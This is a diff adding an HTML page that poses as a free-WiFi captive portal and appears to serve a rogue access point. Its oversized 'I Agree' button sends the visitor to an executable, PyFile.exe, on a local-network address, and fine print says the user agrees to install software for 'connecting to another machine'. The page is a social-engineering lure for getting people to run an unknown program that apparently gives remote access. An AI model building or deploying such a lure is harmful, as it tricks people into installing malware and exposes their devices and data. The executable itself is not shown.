@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Page</title>
+    <style>
+        body {
+            text-align: center;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        #downloadButton {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 60px 128px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 64px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>For Connect to this Free-WiFi Accept with necessary purposes</h1>
+    <p>Please read and agree to the instructions down bellow ! before downloading the application.</p>
+    <br></br>
+    <br></br>
+    <br></br>
+    <br></br>
+    <br></br>
+    <button id="downloadButton">I Agree</button>
+    <h2>Click I Agree For Connect to Free-WiFi</h2>
+    <script>
+        const downloadButton = document.getElementById('downloadButton');
+        downloadButton.addEventListener('click', () => {
+            // Redirect to the download link after clicking the button
+            window.location.href = 'http://192.168.0.1/PyFile.exe';
+        });
+    </script>
+    <br></br>
+    <br></br>
+    <br></br>
+    <br></br>
+    <br></br>
+    <p>By clicking on this button, you agree to download third-party software for connecting to another machine and IP.</p>
+</body>
+</html>
